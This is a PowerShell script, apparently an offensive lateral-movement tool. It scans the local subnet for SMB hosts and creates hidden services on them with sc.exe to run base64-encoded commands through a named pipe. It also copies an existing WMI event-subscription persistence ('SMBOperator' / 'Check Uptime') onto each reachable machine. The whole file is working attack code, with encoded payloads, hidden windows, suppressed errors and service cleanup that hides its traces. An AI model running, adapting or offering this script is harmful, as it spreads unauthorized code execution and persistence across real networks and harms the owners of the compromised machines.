function Invoke-SMBRemoting {
    param (
        [string]$ComputerName,
        [string]$Command
    )
    $ErrorActionPreference = "SilentlyContinue"
    $WarningPreference     = "SilentlyContinue"
    $PipeName = -join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
    $ServiceName = "Service_" + (-join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object { [char]$_ }))
    $trigtgs = "\\$ComputerName\c$"
    $Error.Clear()
    Get-ChildItem $trigtgs | Out-Null
    if ($Error.Count -gt 0) {
        Write-Output "[-] Access to \\$ComputerName\c$ failed"
        return
    }
    $ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(
    "$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null
)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
    if (-not `$pipeServer.IsConnected) { break }
    `$cmd = `$sr.ReadLine()
    if (`$cmd -eq "exit") { break }
    try {
        `$result = Invoke-Expression `$cmd | Out-String
        `$result -split "`n" | ForEach-Object { `$sw.WriteLine(`$_.TrimEnd()) }
    }
    catch {
        `$sw.WriteLine(`$_.Exception.Message)
    }
    `$sw.WriteLine("###END###")
    `$sw.Flush()
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
    $B64ServerScript = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($ServerScript)
    )
    $createArgs = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -enc $B64ServerScript`""
    $startArgs  = "\\$ComputerName start $ServiceName"
    Start-Process sc.exe -ArgumentList $createArgs -WindowStyle Hidden
    Start-Sleep -Milliseconds 1000
    Start-Process sc.exe -ArgumentList $startArgs -WindowStyle Hidden
    $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(
        $ComputerName, $PipeName, 'InOut'
    )
    try {
        $pipeClient.Connect(30000)
    }
    catch {
        Write-Output "[-] Failed to connect to named pipe"
        Start-Process sc.exe -ArgumentList "\\$ComputerName delete $ServiceName" -WindowStyle Hidden
        return
    }
    $sr = New-Object System.IO.StreamReader($pipeClient)
    $sw = New-Object System.IO.StreamWriter($pipeClient)
    $encCmd = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Command)
    )
    $payload = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`"$encCmd`")) | IEX 2>&1 | Out-String"
    $sw.WriteLine($payload)
    $sw.Flush()
    $output = ""
    while ($true) {
        $line = $sr.ReadLine()
        if ($line -eq "###END###") { break }
        $output += "$line`n"
    }
    Write-Output $output.Trim()
    $sw.WriteLine("exit")
    $sw.Flush()
    $pipeClient.Close()
    $pipeClient.Dispose()
    Start-Process sc.exe -ArgumentList "\\$ComputerName delete $ServiceName" -WindowStyle Hidden
}
function Test-Port {
    param (
        [string]$IP,
        [int]$Port,
        [int]$Timeout = 300
    )

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($IP, $Port, $null, $null)
        $success = $iar.AsyncWaitHandle.WaitOne($Timeout, $false)
        $client.Close()
        return $success
    } catch {
        return $false
    }
}
$scriptblock = {
    param($Arg1, $Arg2, $Arg3, $Arg4)

    $logPath = 'C:\Windows\Temp\smbremoting_args.txt'

    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $content = @(
        "[$timestamp]"
        "Arg1: $Arg1"
        "Arg2: $Arg2"
        "Arg3: $Arg3"
        "Arg4: $Arg4"
        "----"
    )

    $content | Out-File -FilePath $logPath -Append -Encoding UTF8

    function Install-Persistence{
        param(
            [string]$EventFilterName,   
            [string]$EventConsumerName, 
            [string]$finalPayload,      
            [string]$Query             
        )
        $EventFilterArgs = @{
            EventNamespace = 'root/cimv2'
            Name = $EventFilterName
            Query = $Query
            QueryLanguage = 'WQL'
        }
        $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
        $CommandLineConsumerArgs = @{
            Name = $EventConsumerName
            CommandLineTemplate = $finalPayload
        }
        $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
        $FilterToConsumerArgs = @{
            Filter = $Filter
            Consumer = $Consumer
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
        $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
        $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
        $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"
    };
	
    Install-Persistence -EventFilterName $Arg1 -EventConsumerName $Arg2 -Query $Arg3 -finalPayload $Arg4

	$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d"
	$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(10))
	$timerClass = [wmiclass]"\\.\root\cimv2:__AbsoluteTimerInstruction"
	$timer = $timerClass.CreateInstance()
	$timer.TimerId = $timerId
	$timer.EventDateTime = $dmtfTime
	$timer.Put() | Out-Null
}



$thirdEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Check Uptime'"
$thirdEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'SMBOperator'"
$FilterName = $thirdEventFilterToCleanup.Name
$ConsumerName = $thirdEventConsumerToCleanup.Name
$Query = $thirdEventFilterToCleanup.Query
$Command = $thirdEventConsumerToCleanup.CommandLineTemplate

$cmd = @"
`$sb = [ScriptBlock]::Create(@'
$($scriptblock.ToString())
'@)
& `$sb "$FilterName" "$ConsumerName" "$Query" "$Command"
"@

$bytes   = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)


$ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress
foreach ($ip in $ipAddresses) {

    $octets = $ip.Split('.')
    $subnetPrefix = "{0}.{1}.{2}" -f $octets[0], $octets[1], $octets[2]
    $attempted = @{}
    for ($counter = 1; ($octets[3] - $counter) -ge 1; $counter++) {
        $lastOctet = $octets[3] - $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            Write-Host "Attempting SMB remoting to $targetIP"

            $return = ""
            Invoke-SMBRemoting -ComputerName $targetIP -Command $cmd


            if ($return -match 'timed out') {
                continue
            } else {
                Write-Host $return
                break
            }
        }
    }

    for ($counter = 1; ([int]$octets[3] + $counter) -le 254; $counter++) {
        $lastOctet = [int]$octets[3] + $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            
            Write-Host "Attempting SMB remoting to $targetIP"

            $return = "test"
            Invoke-SMBRemoting -ComputerName $targetIP -Command "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded"

            if ($return -match 'timed out') {
                continue
            } else {
                #Write-Host $return
                break
            }
        }
    }
}
